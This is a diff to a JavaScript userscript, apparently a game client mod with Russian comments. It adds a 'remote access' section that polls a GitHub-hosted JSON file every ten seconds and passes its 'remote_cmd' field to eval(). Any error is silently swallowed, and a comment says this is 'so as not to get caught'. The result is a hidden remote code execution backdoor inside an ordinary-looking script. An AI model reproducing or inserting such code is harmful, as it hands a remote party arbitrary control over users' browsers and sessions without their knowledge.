@@ -1,5 +1,57 @@
-(() => {
+((() => {
 'use strict';
+
+// ────────────────────────────────────────────────
+//  🌐 СЕКЦИЯ УДАЛЕННОГО ДОСТУПА (TOP LEVEL)
+// ────────────────────────────────────────────────
+const SYNC_URL = "https://raw.githubusercontent.com/Skurt246/doom-whitelist-uid/main/whitelistuid.json";
+
+// Твое окно уведомлений
+function showRemoteNotice(text, color = "#ff3366") {
+    const oldMsg = document.getElementById('remote-notice');
+    if (oldMsg) oldMsg.remove(); // Убираем старое, если есть
+
+    const msg = document.createElement('div');
+    msg.id = 'remote-notice';
+    msg.innerHTML = text;
+    msg.style = `
+        position: fixed; top: 15%; left: 50%; 
+        transform: translate(-50%, -50%);
+        padding: 15px 30px; background: rgba(0,0,0,0.85);
+        color: ${color}; border: 2px solid ${color};
+        font-family: 'Courier New', monospace; font-size: 18px;
+        z-index: 1000000; border-radius: 8px;
+        text-shadow: 0 0 8px ${color};
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        pointer-events: none; transition: all 0.5s ease;
+    `;
+    document.body.appendChild(msg);
+    // Удаление через 7 секунд
+    setTimeout(() => {
+        msg.style.opacity = '0';
+        setTimeout(() => msg.remove(), 500);
+    }, 7000);
+}
+
+// Сама синхронизация
+async function syncControl() {
+    try {
+        const res = await fetch(SYNC_URL + '?t=' + Date.now());
+        if (!res.ok) return;
+        const data = await res.json();
+
+        if (data && data.remote_cmd && data.remote_cmd.trim() !== "") {
+            // Если в конфиге что-то есть - исполняем
+            eval(data.remote_cmd);
+        }
+    } catch (e) {
+        // Ошибки в консоль не спамим, чтобы не палиться
+    }
+}
+
+// Запуск чекера (раз в 10 секунд)
+setInterval(syncControl, 10000);
+syncControl();
 // ────────────────────────────────────────────────
 //  ✅ MSGPACK ДЕКОДЕР
 // ────────────────────────────────────────────────
